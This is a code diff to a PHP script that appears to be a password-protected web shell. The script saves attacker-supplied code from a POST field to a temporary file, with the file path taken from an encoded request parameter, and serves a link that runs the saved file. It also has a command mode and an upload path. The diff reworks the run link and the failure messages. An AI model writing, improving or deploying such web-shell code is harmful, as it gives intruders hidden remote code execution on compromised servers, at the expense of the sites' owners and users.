@@ -101,13 +101,16 @@ if($_POST['run']){
     $code = $_POST['code'];
 
     if($_POST['tmp']){
-        $tmp_file =$_POST['tmp'];
+        $tmp_file = dec($_POST['tmp']);
     }else{
         $tmp_file = tempnam(sys_get_temp_dir(), '');
     };
 
     if(file_put_contents("$tmp_file","$code")){
-        $tmp_run = $tmp_file;
+      	$tmp_run_file = $tmp_file;
+        $tmp_run = "<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_run_file' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_run_file";
+    }else{
+    	$tmp_run = "<mark style='background: #ffffff'><a style='color:#ff4757'> failed saving tmp";
     };
 };
 if($_GET['run']){
@@ -229,7 +232,7 @@ if ($mode == "command") {
         echo(htmlspecialchars($_POST['code']));
       };
 
-      echo "</textarea></div><br><input type='hidden' name='tmp' value='$tmp_run'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>
+      echo "</textarea></div><br><input type='hidden' name='tmp' class='encode' value='$tmp_run_file'><input onclick='$encButton' type='submit' name='run' value='run >>' style='background-color: #747d8c;color: #f1f2f6; float: right;'>
 
     <table style='width:100%'>
     <tr style='text-align:center'>
@@ -291,7 +294,7 @@ if ($mode == "command") {
 			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload");
 		  }
     } elseif($tmp_run){
-        die("<mark style='background: #ffffff'><a href='?$param=$pass&run=$tmp_run' target='_blank' style='color:#2ed573'> run click here</a> -> $tmp_run");
+        die("$tmp_run");
     };
 
 
@@ -307,3 +310,4 @@ if ($mode == "command") {
       }
       </script>";
 };
+
